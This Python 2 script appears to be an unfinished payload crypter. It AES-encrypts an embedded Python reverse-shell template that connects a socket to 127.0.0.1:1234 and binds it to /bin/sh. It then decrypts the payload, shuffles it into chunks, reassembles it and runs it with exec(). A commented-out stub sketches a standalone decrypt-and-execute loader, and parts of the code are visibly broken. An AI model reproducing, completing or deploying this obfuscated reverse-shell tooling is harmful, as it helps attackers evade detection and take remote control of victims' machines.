import re,random,string,Crypto,binascii
from Crypto.Cipher import AES
from binascii import hexlify

arrayList = []
def fillList(arrayBrokenShellCode,toFill):
    # i = arrayBrokenShellCoFill):
    for i in range(0,toFill):
        arrayBrokenShellCode.append("aa")
    return arrayBrokenShellCode
def generateArrayList(l):
    # l = l.replace(r'\[','\\[').replace(r'\]','\\]').replace(r'\(','\\(').replace(r'\)','\\)')
    arrayBrokenShellCode = re.findall('..?',l)
#  x = map(lambda foo: foo.replace('a', 'b'), x), Example
    # x = map(lambda arrayBrokenShellCode: arrayBrokenShellCode[x].replace(r'[','\['),replace(r']','\]'),x)
#     # arrayBrokenShellCode = list(x)
# # for i, v in enumerate(x) :
# # x[i] = v.replace("a","b")
#     for v in enumerate(arrayBrokenShellCode):
#         # v = arrayBrokenShellCode[i]
#         # print vode.index(v)
#         # print i,v
#         arrayBrokenShellCode[i] = v.replace("[","\[").replace("]","\]")
    # print arrayBrokenShellCode
    # for pair in arrayBrokenShellCode:
    #     pair = pair.replace(r"[","\[").replace(r"]","\]")
    arrayBSOrig = list(arrayBrokenShellCode)
    # print "DEBUG: ",arrayBSOrig
    toFill = 50 - len(arrayBrokenShellCode)
    arrayBrokenShellCode = fillList(arrayBrokenShellCode,toFill)
    arrayShuffled = random.sample(arrayBrokenShellCode,len(arrayBrokenShellCode))
    for i in arrayShuffled:
        if i == 'aa' or None:
            char = ''.join(random.choice(string.ascii_lowercase) for i in range(2))
            arrayShuffled[arrayShuffled.index(i)] = char
    return arrayShuffled,arrayBSOrig
scmap = []
def remap(arrayBSOrig,arrayShuffled):
    for word in arrayBSOrig:
        # print "Word query:\r\n",word
        mapped = arrayShuffled.index(word)
        scmap.append(mapped)
    return scmap
def reconstituteSC(arrayShuffled,scmap):
    cmd=""
    for index in scmap:
        # # print 'DEBUG: Value of Array of Index: \r\n{}'.format(str(index)),arrayShuffled
        cmd += arrayShuffled[index]
        # print "Command string built:\r\n",cmd
        # # print 'DEBUG: Value of cmd to be executed: \r\n{}'.format(str(cmd))
    cmd = cmd.strip().rstrip()
    print "Executing Command:\r\n{}".format(str(cmd))
    exec(cmd)
    return cmd

def reconstituteOrig(arrayBSOrig):
    # for 
    # cmd = ""
    shell=[]
    # for v in arrayBSOrig:
    #     cmd = "{}{}".format(str(cmd),str(v))
    # shell.append(cmd)
    for x in arrayBSOrig:
        cmd = ""
        try:
            cmd = "".join(x)
            shell.append(cmd)
        except:
            pass
    print shell
    for c in shell:
        cmd = c
        print "Executing Command:\r\n{}".format(str(cmd))
        exec(cmd)
    return

# def fuckthisshit(arrayBSOrig):
#     for x in arrayBSOrig:
#         sublist = x
#         for y in sublist:
#             cmd = "".join(y)
#             print cmd
#     return
def generateKey(size=32,chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for x in range(size))

def generateIV(size=16,chars=string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for x in range(size))
def cryptor(shellcommands, key, IV):
    obj = AES.new(key,AES.MODE_CFB,IV)
    # #print "DEBUG: Shell Commands", shellcommands
    ciphertext = obj.encrypt(shellcommands)
    # #print "DEBUG: Ciphertext", ciphertext

    return ciphertext

def safeDecryptShellCommands(ciphertext, key, IV):
    obj3 = AES.new(key,AES.MODE_CFB,IV)
    plainTextCmd = obj3.decrypt(ciphertext)
    #print plainTextCmd

    return plainTextCmd

def writePayloadToFile(l_encrypted):
    payload = 'payload.txt'
    w = open(payload,'w+')
    w.write(l_encrypted)
    w.close()

    return payload

def executeEncryptedPayload(payload,decryptKey,decryptIV):
    r = open(payload,'r+')
    cryptedPayload = r.read()
    r.close()
    x = safeDecryptShellCommands(cryptedPayload,decryptKey,decryptIV)
    lines = x.splitlines()

    return lines
template_reverse_shell = """
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("127.0.0.1",1234))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
"""
template_reverse_shell = template_reverse_shell.strip().rstrip()
def main():
    decryptKey = generateKey()
    decryptIV = generateIV()
    
    # lines = template_reverse_shell.splitlines()
    l_encrypted = cryptor(template_reverse_shell,decryptKey,decryptIV)
#     l_encrypted = """
# import re,random,string,Crypto,binascii
# from Crypto.Cipher import AES
# k="{}"
# i="{}"
# d="{}"
# def generateArrayList(l):
#     abs = re.findall('..?',l)
#     arrayBSOrig = list(abs)
#     toFill = 50 - len(abs)
#     abs = fillList(abs,toFill)
#     arrayShuffled = random.sample(abs,len(abs))
#     for i in arrayShuffled:
#         if i == 'aa' or None:
#             char = ''.join(random.choice(string.ascii_lowercase) for i in range(2))
#             arrayShuffled[arrayShuffled.index(i)] = char
#     return as,abso
# def ddc(d, k, i):
#     obj3 = AES.new(key,AES.MODE_CFB,IV)
#     plainTextCmd = obj3.decrypt(ciphertext)
#     return c
# def exddc(d,k,i):
#     cP = d
#     x = ddc(cP,k,i)
#     lines = x.splitlines()
#     return lines
# def main():
#     c=exddc(d,k,i)
#     for l in c:
#         as, abso = generateArrayList(c)
#         scmap = remap(abso,as)
#         for l in c:
#             arr = re.findall('..?',c)
#             cd="".join(arr)
#             exec(cd)
#     return
# main()
#     """.format(
#         str(decryptKey),
#         str(generateIV),
#         str(l_encrypted))
    payload = writePayloadToFile(l_encrypted)
    out = hexlify(l_encrypted)
    print "DEBUG:\r\n{}".format(str(out))
    lines = executeEncryptedPayload(payload,decryptKey,decryptIV)
    print "DEBUG:\r\n{}".format(str(lines))

    for l in lines:
        arrayShuffled, arrayBSOrig = generateArrayList(l)
        # print "Shuffled array\r\n",arrayShuffled,"\r\nOriginal array\r\n",arrayBSOrig
        scmap = remap(arrayBSOrig,arrayShuffled)
        # reconstituteSC(arrayShuffled,scmap)
        # reconstituteOrig(arrayBSOrig)
        # fuckthisshit(arrayBSOrig)

        for l in lines:
            array = re.findall('..?',l)
            print array
            cmd = "".join(array)
            print "Reconstituted:\r\n",cmd
            exec(cmd)
# Figure out why the fuck this doesn't work
# Its as if you got the array from the same function, it will work
# But if you got it from calling a different function, it doesn't work.
        # for x in arrayBSOrig:
        #     cmd = "".join(x)
        #     print cmd
        #     exec(cmd)
    return
main()
